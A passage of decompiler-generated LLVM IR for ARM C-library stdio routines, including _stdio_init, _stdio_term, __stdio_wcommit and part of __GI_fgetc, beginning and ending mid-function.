  uselistorder label %dec_label_pc_17ebc, { 1, 0 }
  uselistorder label %dec_label_pc_17e60, { 1, 0 }
  uselistorder label %bb62, { 1, 0 }
  uselistorder label %dec_label_pc_17e50, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17e38, { 1, 0 }
  uselistorder label %dec_label_pc_17df8, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %dec_label_pc_17de8, { 1, 0 }
  uselistorder label %bb58, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17d30, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_17c98._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17c40, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_17bdc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ba4, { 1, 2, 0 }
}

define i32 @function_17f94(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17f94:
  %v0_17f94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17f94, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17f94
  %v5_17f94 = sdiv i32 %arg2, 16
  %v6_17f94 = and i32 %v5_17f94, %arg1
  %v5_17f98 = sdiv i32 %arg2, 256
  %v6_17f98 = and i32 %v6_17f94, %v5_17f98
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17f94, %bb
  %v10_17f9c = phi i32 [ %arg1, %dec_label_pc_17f94 ], [ %v6_17f98, %bb ]
  ret i32 %v10_17f9c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_17fcc = call i32 @__aeabi_read_tp()
  %v3_17fd0 = load i16, i16* @global_var_244d0.762, align 2
  %v4_17fd0 = sext i16 %v3_17fd0 to i32
  store i32 %v4_17fd0, i32* @r3, align 4
  store i32 %v0_17fcc, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_17fdc = add i32 %v4_17fd0, %v0_17fcc
  %v3_17fdc = inttoptr i32 %v2_17fdc to i32*
  %v4_17fdc = load i32, i32* %v3_17fdc, align 4
  store i32 %v4_17fdc, i32* @r6, align 4
  %v1_17fe0 = call i32 @isatty(i32 0)
  %v2_17fe8 = icmp eq i32 %v1_17fe0, 0
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* @r4, align 4
  br i1 %v2_17fe8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_17ff4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 308) to i16*), align 4
  %v7_17ff4 = zext i16 %v5_17ff4 to i32
  %v2_17ff8 = xor i32 %v7_17ff4, 256
  store i32 %v2_17ff8, i32* @r3, align 4
  %v2_17ffc = trunc i32 %v2_17ff8 to i16
  store i16 %v2_17ffc, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_18004 = call i32 @isatty(i32 1)
  %v2_18008 = icmp eq i32 %v1_18004, 0
  br i1 %v2_18008, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_18010 = load i32, i32* @r4, align 4
  %v2_18014 = add i32 %v1_18010, 376
  %v3_18014 = inttoptr i32 %v2_18014 to i16*
  %v4_18014 = load i16, i16* %v3_18014, align 2
  %v2_18018 = xor i16 %v4_18014, 256
  store i16 %v2_18018, i16* %v3_18014, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_18024 = load i16, i16* @global_var_244d0.762, align 2
  %v4_18024 = sext i16 %v3_18024 to i32
  %v0_18028 = load i32, i32* @r6, align 4
  %v1_18028 = load i32, i32* @r5, align 4
  %v3_18028 = add i32 %v1_18028, %v4_18024
  %v4_18028 = inttoptr i32 %v3_18028 to i32*
  store i32 %v0_18028, i32* %v4_18028, align 4
  ret i32 %v1_18004

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_18044 = load i32, i32* @r4, align 4
  store i32 %v3_18044, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_24478.766 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_18058 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_18058, i32* %r0.global-to-local, align 4
  %v5_18058 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_18058, i32* %r1.global-to-local, align 4
  %v8_18058 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -33092) to i32*), align 4
  %v2_18060 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_18060, i32* %r3.global-to-local, align 4
  store i32 %v2_18058, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1806c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 152) to i32*), align 4
  store i32 %v2_18058, i32* %r0.global-to-local, align 4
  store i32 %v5_18058, i32* %r1.global-to-local, align 4
  store i32 %v8_18058, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_24478.766 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_1807c = inttoptr i32 %v4_1806c to i32*
  store i32 %v2_18058, i32* %v1_1807c, align 4
  %v3_1807c = add i32 %v4_1806c, 4
  %v4_1807c = inttoptr i32 %v3_1807c to i32*
  %v5_1807c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1807c, i32* %v4_1807c, align 4
  %v6_1807c = add i32 %v4_1806c, 8
  %v7_1807c = inttoptr i32 %v6_1807c to i32*
  %v8_1807c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1807c, i32* %v7_1807c, align 4
  %v0_18080 = load i32, i32* %r3.global-to-local, align 4
  %v1_18080 = inttoptr i32 %v0_18080 to i32*
  %v2_18080 = load i32, i32* %v1_18080, align 4
  store i32 %v2_18080, i32* %r0.global-to-local, align 4
  %v3_18080 = add i32 %v0_18080, 4
  %v4_18080 = inttoptr i32 %v3_18080 to i32*
  %v5_18080 = load i32, i32* %v4_18080, align 4
  store i32 %v5_18080, i32* %r1.global-to-local, align 4
  %v6_18080 = add i32 %v0_18080, 8
  %v7_18080 = inttoptr i32 %v6_18080 to i32*
  %v8_18080 = load i32, i32* %v7_18080, align 4
  %v2_18084 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_18084, i32* %r3.global-to-local, align 4
  store i32 %v2_18080, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_18090 = load i32, i32* %r7.global-to-local, align 4
  %v2_18090 = add i32 %v0_18090, 76
  %v3_18090 = inttoptr i32 %v2_18090 to i32*
  %v4_18090 = load i32, i32* %v3_18090, align 4
  store i32 %v4_18090, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_18098 = inttoptr i32 %v4_18090 to i32*
  %v2_18098 = load i32, i32* %v1_18098, align 4
  store i32 %v2_18098, i32* %r5.global-to-local, align 4
  %v2_1809c = add i32 %v0_18090, 160
  %v3_1809c = inttoptr i32 %v2_1809c to i32*
  %v4_1809c = load i32, i32* %v3_1809c, align 4
  store i32 %v2_18080, i32* %r0.global-to-local, align 4
  store i32 %v5_18080, i32* %r1.global-to-local, align 4
  store i32 %v8_18080, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_180ac = add i32 %v0_18090, -33124
  store i32 %v2_180ac, i32* %sl.global-to-local, align 4
  %v1_180b0 = inttoptr i32 %v4_1809c to i32*
  store i32 %v2_18080, i32* %v1_180b0, align 4
  %v3_180b0 = add i32 %v4_1809c, 4
  %v4_180b0 = inttoptr i32 %v3_180b0 to i32*
  %v5_180b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_180b0, i32* %v4_180b0, align 4
  %v6_180b0 = add i32 %v4_1809c, 8
  %v7_180b0 = inttoptr i32 %v6_180b0 to i32*
  %v8_180b0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_180b0, i32* %v7_180b0, align 4
  %v0_18140.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1814016 = icmp eq i32 %v0_18140.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1814818 = add i32 %v0_18140.pr, 56
  store i32 %v1_1814818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1814016, label %dec_label_pc_18154, label %dec_label_pc_180b8

dec_label_pc_180b8:                               ; preds = %entry, %.thread10
  %v0_180b8 = phi i32 [ %v3_1813c, %.thread10 ], [ %v0_18140.pr, %entry ]
  %v1_180b8 = add i32 %v0_180b8, 64
  %v2_180b8 = inttoptr i32 %v1_180b8 to i32*
  %v3_180b8 = load i32, i32* %v2_180b8, align 4
  store i32 %v3_180b8, i32* %r3.global-to-local, align 4
  %v0_180bc = call i32 @__aeabi_read_tp()
  store i32 %v0_180bc, i32* %r0.global-to-local, align 4
  %v1_180c0 = add i32 %v0_180bc, -1168
  store i32 %v1_180c0, i32* %r6.global-to-local, align 4
  %v3_180c4 = icmp uge i32 %v3_180b8, %v1_180c0
  store i1 %v3_180c4, i1* %cpsr_c.global-to-local, align 1
  %v9_180c4 = icmp eq i32 %v3_180b8, %v1_180c0
  br i1 %v9_180c4, label %.thread1, label %dec_label_pc_180d8

.thread1:                                         ; preds = %dec_label_pc_180b8
  %v1_180c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_180c8 = add i32 %v1_180c8, 60
  %v3_180c8 = inttoptr i32 %v2_180c8 to i32*
  %v4_180c8 = load i32, i32* %v3_180c8, align 4
  %v2_180cc = add i32 %v4_180c8, 1
  store i32 %v2_180cc, i32* %r3.global-to-local, align 4
  store i32 %v2_180cc, i32* %v3_180c8, align 4
  br label %.thread10

dec_label_pc_180d8:                               ; preds = %dec_label_pc_180b8, %dec_label_pc_180e4
  %v0_180d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_180d8 = inttoptr i32 %v0_180d8 to i32*
  %v2_180d8 = load i32, i32* %v1_180d8, align 4
  store i32 %v2_180d8, i32* %r3.global-to-local, align 4
  %v1_180dc = load i32, i32* %r4.global-to-local, align 4
  %v3_180dc = icmp uge i32 %v2_180d8, %v1_180dc
  store i1 %v3_180dc, i1* %cpsr_c.global-to-local, align 1
  %v9_180dc = icmp eq i32 %v2_180d8, %v1_180dc
  br i1 %v9_180dc, label %dec_label_pc_180e4, label %dec_label_pc_180fc

dec_label_pc_180e4:                               ; preds = %dec_label_pc_180d8
  store i32 %v2_180d8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_180f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_180f4, label %dec_label_pc_180f8, label %dec_label_pc_180d8

dec_label_pc_180f8:                               ; preds = %dec_label_pc_180e4
  %v0_180f8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_180f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_180fc

dec_label_pc_180fc:                               ; preds = %dec_label_pc_180d8, %dec_label_pc_180f8
  %v0_180fc = phi i32 [ %v0_180f8, %dec_label_pc_180f8 ], [ %v2_180d8, %dec_label_pc_180d8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_180fc = icmp eq i32 %v0_180fc, 0
  %v2_18108.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_180fc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_180fc
  %v1_18108 = load i32, i32* %r6.global-to-local, align 4
  %v3_18108 = add i32 %v2_18108.pre, 64
  %v4_18108 = inttoptr i32 %v3_18108 to i32*
  store i32 %v1_18108, i32* %v4_18108, align 4
  %v1_1810c = load i32, i32* %r1.global-to-local, align 4
  %v2_1810c = load i32, i32* %r5.global-to-local, align 4
  %v3_1810c = add i32 %v2_1810c, 60
  %v4_1810c = inttoptr i32 %v3_1810c to i32*
  store i32 %v1_1810c, i32* %v4_1810c, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_180fc
  %v2_18100 = add i32 %v2_18108.pre, 8
  %v3_18100 = inttoptr i32 %v2_18100 to i32*
  %v4_18100 = load i32, i32* %v3_18100, align 4
  store i32 %v4_18100, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_18110 = add i32 %v2_18108.pre, 20
  %v4_18110 = inttoptr i32 %v3_18110 to i32*
  store i32 %v4_18100, i32* %v4_18110, align 4
  %v1_18114 = load i32, i32* %r2.global-to-local, align 4
  %v2_18114 = trunc i32 %v1_18114 to i16
  %v3_18114 = load i32, i32* %r5.global-to-local, align 4
  %v4_18114 = inttoptr i32 %v3_18114 to i16*
  store i16 %v2_18114, i16* %v4_18114, align 2
  %v1_18118 = load i32, i32* %r3.global-to-local, align 4
  %v2_18118 = load i32, i32* %r5.global-to-local, align 4
  %v3_18118 = add i32 %v2_18118, 24
  %v4_18118 = inttoptr i32 %v3_18118 to i32*
  store i32 %v1_18118, i32* %v4_18118, align 4
  %v1_1811c = load i32, i32* %r3.global-to-local, align 4
  %v2_1811c = load i32, i32* %r5.global-to-local, align 4
  %v3_1811c = add i32 %v2_1811c, 28
  %v4_1811c = inttoptr i32 %v3_1811c to i32*
  store i32 %v1_1811c, i32* %v4_1811c, align 4
  %v1_18120 = load i32, i32* %r3.global-to-local, align 4
  %v2_18120 = load i32, i32* %r5.global-to-local, align 4
  %v3_18120 = add i32 %v2_18120, 16
  %v4_18120 = inttoptr i32 %v3_18120 to i32*
  store i32 %v1_18120, i32* %v4_18120, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_18124 = load i32, i32* %sl.global-to-local, align 4
  %v1_18124 = inttoptr i32 %v0_18124 to i32*
  %v2_18124 = load i32, i32* %v1_18124, align 4
  store i32 %v2_18124, i32* %r0.global-to-local, align 4
  %v3_18124 = add i32 %v0_18124, 4
  %v4_18124 = inttoptr i32 %v3_18124 to i32*
  %v5_18124 = load i32, i32* %v4_18124, align 4
  store i32 %v5_18124, i32* %r1.global-to-local, align 4
  %v6_18124 = add i32 %v0_18124, 8
  %v7_18124 = inttoptr i32 %v6_18124 to i32*
  %v8_18124 = load i32, i32* %v7_18124, align 4
  store i32 %v8_18124, i32* %r2.global-to-local, align 4
  %v1_1812c = load i32, i32* %r5.global-to-local, align 4
  %v2_1812c = add i32 %v1_1812c, 52
  %v3_1812c = inttoptr i32 %v2_1812c to i32*
  store i32 1, i32* %v3_1812c, align 4
  %v0_18130 = load i32, i32* %r5.global-to-local, align 4
  %v1_18130 = add i32 %v0_18130, 56
  store i32 %v1_18130, i32* %r3.global-to-local, align 4
  %v2_18134 = load i32, i32* %r0.global-to-local, align 4
  %v1_18138 = inttoptr i32 %v1_18130 to i32*
  store i32 %v2_18134, i32* %v1_18138, align 4
  %v3_18138 = add i32 %v0_18130, 60
  %v4_18138 = inttoptr i32 %v3_18138 to i32*
  %v5_18138 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_18138, i32* %v4_18138, align 4
  %v6_18138 = add i32 %v0_18130, 64
  %v7_18138 = inttoptr i32 %v6_18138 to i32*
  %v8_18138 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_18138, i32* %v7_18138, align 4
  %v0_1813c = load i32, i32* %r5.global-to-local, align 4
  %v1_1813c = add i32 %v0_1813c, 32
  %v2_1813c = inttoptr i32 %v1_1813c to i32*
  %v3_1813c = load i32, i32* %v2_1813c, align 4
  store i32 %v3_1813c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18140 = icmp eq i32 %v3_1813c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_18148 = add i32 %v3_1813c, 56
  store i32 %v1_18148, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_18140, label %dec_label_pc_18154, label %dec_label_pc_180b8

dec_label_pc_18154:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_18158 = load i32, i32* %r7.global-to-local, align 4
  %v2_18158 = add i32 %v0_18158, 76
  %v3_18158 = inttoptr i32 %v2_18158 to i32*
  %v4_18158 = load i32, i32* %v3_18158, align 4
  store i32 %v4_18158, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_18158 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1817814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1817814, label %dec_label_pc_18180, label %dec_label_pc_18164

dec_label_pc_18164:                               ; preds = %dec_label_pc_18154, %dec_label_pc_18178
  %v1_1816c = phi i32 [ %storemerge, %dec_label_pc_18178 ], [ %storemerge12, %dec_label_pc_18154 ]
  %v1_18164 = inttoptr i32 %v1_1816c to i16*
  %v2_18164 = load i16, i16* %v1_18164, align 2
  %v3_18164 = zext i16 %v2_18164 to i32
  store i32 %v3_18164, i32* %r3.global-to-local, align 4
  %v1_18168 = and i32 %v3_18164, 64
  %v2_18168 = icmp eq i32 %v1_18168, 0
  br i1 %v2_18168, label %dec_label_pc_18178, label %bb39

bb39:                                             ; preds = %dec_label_pc_18164
  store i32 %v1_1816c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18178

dec_label_pc_18178:                               ; preds = %dec_label_pc_18164, %bb39
  %v1_18170 = xor i1 %v2_18168, true
  call void @__pseudo_cond_branch(i1 %v1_18170, i32 ptrtoint (i32* @global_var_181a8.1045 to i32))
  %v0_18174 = load i32, i32* %r4.global-to-local, align 4
  %v1_18174 = add i32 %v0_18174, 32
  %storemerge.in = inttoptr i32 %v1_18174 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18178 = icmp eq i32 %storemerge, 0
  br i1 %v2_18178, label %dec_label_pc_18180, label %dec_label_pc_18164

dec_label_pc_18180:                               ; preds = %dec_label_pc_18178, %dec_label_pc_18154
  %v2_18184 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_18184, i32* %r4.global-to-local, align 4
  %v1_18188 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_18188

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1813c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_180dc, { 1, 0 }
  uselistorder i32 %v4_1809c, { 2, 1, 0 }
  uselistorder i32 %v4_1806c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 2, 7, 6, 0, 5, 3, 4, 1 }
  uselistorder i32* %r2.global-to-local, { 6, 1, 2, 3, 4, 5, 0, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 4, 1, 2, 3, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 0, 7, 3, 4, 5, 6, 1 }
  uselistorder label %dec_label_pc_18178, { 1, 0 }
  uselistorder label %dec_label_pc_18164, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_180fc, { 1, 0 }
  uselistorder label %dec_label_pc_180d8, { 1, 0 }
  uselistorder label %dec_label_pc_180b8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_181a8 = load i32, i32* @r4, align 4
  store i32 %v3_181a8, i32* %stack_var_-8, align 4
  %v1_181ac = add i32 %arg1, 8
  %v2_181ac = inttoptr i32 %v1_181ac to i32*
  %v3_181ac = load i32, i32* %v2_181ac, align 4
  store i32 %v3_181ac, i32* @r1, align 4
  %v1_181b0 = add i32 %arg1, 16
  %v2_181b0 = inttoptr i32 %v1_181b0 to i32*
  %v3_181b0 = load i32, i32* %v2_181b0, align 4
  %v9_181b4 = icmp eq i32 %v3_181b0, %v3_181ac
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_181b4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_181ac, i32* %v2_181b0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_181c0 = xor i1 %v9_181b4, true
  call void @__pseudo_cond_branch(i1 %v1_181c0, i32 ptrtoint (i32* @global_var_19b98.1046 to i32))
  %v0_181c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_181c4 = add i32 %v0_181c4, 8
  %v2_181c4 = inttoptr i32 %v1_181c4 to i32*
  %v3_181c4 = load i32, i32* %v2_181c4, align 4
  %v1_181c8 = add i32 %v0_181c4, 16
  %v2_181c8 = inttoptr i32 %v1_181c8 to i32*
  %v3_181c8 = load i32, i32* %v2_181c8, align 4
  %v2_181cc = sub i32 %v3_181c8, %v3_181c4
  %v2_181d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_181d0, i32* @r4, align 4
  ret i32 %v2_181cc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_181d8 = load i32, i32* @r4, align 4
  store i32 %v3_181d8, i32* %stack_var_-20, align 4
  %v6_181d8 = load i32, i32* @r5, align 4
  %v9_181d8 = load i32, i32* @r6, align 4
  %v12_181d8 = load i32, i32* @r7, align 4
  %v15_181d8 = load i32, i32* @lr, align 4
  %v1_181dc = add i32 %arg1, 52
  %v2_181dc = inttoptr i32 %v1_181dc to i32*
  %v3_181dc = load i32, i32* %v2_181dc, align 4
  store i32 %v3_181dc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_181e0 = icmp eq i32 %v3_181dc, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_181e0, label %dec_label_pc_18214, label %dec_label_pc_181f0

dec_label_pc_181f0:                               ; preds = %entry
  %v1_181f0 = add i32 %arg1, 16
  %v2_181f0 = inttoptr i32 %v1_181f0 to i32*
  %v3_181f0 = load i32, i32* %v2_181f0, align 4
  store i32 %v3_181f0, i32* %r2.global-to-local, align 4
  %v1_181f4 = add i32 %arg1, 24
  %v2_181f4 = inttoptr i32 %v1_181f4 to i32*
  %v3_181f4 = load i32, i32* %v2_181f4, align 4
  store i32 %v3_181f4, i32* %r3.global-to-local, align 4
  %v3_181f8 = icmp uge i32 %v3_181f0, %v3_181f4
  store i1 %v3_181f8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_181f8, label %dec_label_pc_18208, label %.thread

.thread:                                          ; preds = %dec_label_pc_181f0
  %v2_181fc = inttoptr i32 %v3_181f0 to i8*
  %v3_181fc = load i8, i8* %v2_181fc, align 1
  %v4_181fc = zext i8 %v3_181fc to i32
  store i32 %v4_181fc, i32* %r5.global-to-local, align 4
  %v6_181fc = add i32 %v3_181f0, 1
  store i32 %v6_181fc, i32* %r2.global-to-local, align 4
  store i32 %v6_181fc, i32* %v2_181f0, align 4
  br label %dec_label_pc_1830c

dec_label_pc_18208:                               ; preds = %dec_label_pc_181f0
  %v1_18208 = inttoptr i32 %arg1 to i16*
  %v2_18208 = call i32 @getc_unlocked(i16* %v1_18208)
  store i32 %v2_18208, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1830c

dec_label_pc_18214:                               ; preds = %entry
  %v0_18214 = call i32 @__aeabi_read_tp()
  %v0_18218 = load i32, i32* @r7, align 4
  %v1_18218 = add i32 %v0_18218, 64
  %v2_18218 = inttoptr i32 %v1_18218 to i32*
  %v3_18218 = load i32, i32* %v2_18218, align 4
  store i32 %v3_18218, i32* %r3.global-to-local, align 4
  %v1_1821c = add i32 %v0_18214, -1168
  store i32 %v1_1821c, i32* @r6, align 4
  %v3_18220 = icmp uge i32 %v3_18218, %v1_1821c
  store i1 %v3_18220, i1* %cpsr_c.global-to-local, align 1
  %v9_18220 = icmp eq i32 %v3_18218, %v1_1821c
  br i1 %v9_18220, label %dec_label_pc_18268, label %dec_label_pc_18228

dec_label_pc_18228:                               ; preds = %dec_label_pc_18214
  %v1_18228 = add i32 %v0_18218, 56
  store i32 %v1_18228, i32* @r5, align 4
  store i32 %v1_18228, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18234

dec_label_pc_18234:                               ; preds = %dec_label_pc_18240.dec_label_pc_18234_crit_edge, %dec_label_pc_18228
  %v0_18234 = phi i32 [ %v0_18234.pre, %dec_label_pc_18240.dec_label_pc_18234_crit_edge ], [ %v1_18228, %dec_label_pc_18228 ]
  %v1_18234 = inttoptr i32 %v0_18234 to i32*
  %v2_18234 = load i32, i32* %v1_18234, align 4
  store i32 %v2_18234, i32* %r3.global-to-local, align 4
  %v1_18238 = load i32, i32* @r4, align 4
  %v3_18238 = icmp uge i32 %v2_18234, %v1_18238
  store i1 %v3_18238, i1* %cpsr_c.global-to-local, align 1
  %v9_18238 = icmp eq i32 %v2_18234, %v1_18238
  br i1 %v9_18238, label %dec_label_pc_18240, label %dec_label_pc_18258

dec_label_pc_18240:                               ; preds = %dec_label_pc_18234
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_18250 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_18250, label %dec_label_pc_18254, label %dec_label_pc_18240.dec_label_pc_18234_crit_edge

dec_label_pc_18240.dec_label_pc_18234_crit_edge:  ; preds = %dec_label_pc_18240
  %v0_18234.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18234

dec_label_pc_18254:                               ; preds = %dec_label_pc_18240
  %v0_18254 = load i32, i32* @r4, align 4
  store i32 %v0_18254, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18258

dec_label_pc_18258:                               ; preds = %dec_label_pc_18234, %dec_label_pc_18254
  %v0_18258 = phi i32 [ %v0_18254, %dec_label_pc_18254 ], [ %v2_18234, %dec_label_pc_18234 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18258 = icmp eq i32 %v0_18258, 0
  br i1 %v2_18258, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_18258
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_18258, %bb
  store i32 98916, i32* @lr, align 4
  %v1_18260 = xor i1 %v2_18258, true
  call void @__pseudo_cond_branch(i1 %v1_18260, i32 ptrtoint (i32* @global_var_16040.925 to i32))
  %v0_18264 = load i32, i32* @r6, align 4
  %v1_18264 = load i32, i32* @r7, align 4
  %v2_18264 = add i32 %v1_18264, 64
  %v3_18264 = inttoptr i32 %v2_18264 to i32*
  store i32 %v0_18264, i32* %v3_18264, align 4
  %v0_18268.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18268

dec_label_pc_18268:                               ; preds = %dec_label_pc_18214, %bb18
  %v1_18278 = phi i32 [ %v0_18218, %dec_label_pc_18214 ], [ %v0_18268.pre, %bb18 ]
  %v1_18268 = add i32 %v1_18278, 60
  %v2_18268 = inttoptr i32 %v1_18268 to i32*
  %v3_18268 = load i32, i32* %v2_18268, align 4
  store i32 %v3_18268, i32* %r2.global-to-local, align 4
  %v1_1826c = add i32 %v1_18278, 16
  %v2_1826c = inttoptr i32 %v1_1826c to i32*
  %v3_1826c = load i32, i32* %v2_1826c, align 4
  store i32 %v3_1826c, i32* @r1, align 4
  %v1_18270 = add i32 %v1_18278, 24
  %v2_18270 = inttoptr i32 %v1_18270 to i32*
  %v3_18270 = load i32, i32* %v2_18270, align 4
  store i32 %v3_18270, i32* %r3.global-to-local, align 4
  %v1_18274 = add i32 %v3_18268, 1
  store i32 %v1_18274, i32* %r2.global-to-local, align 4
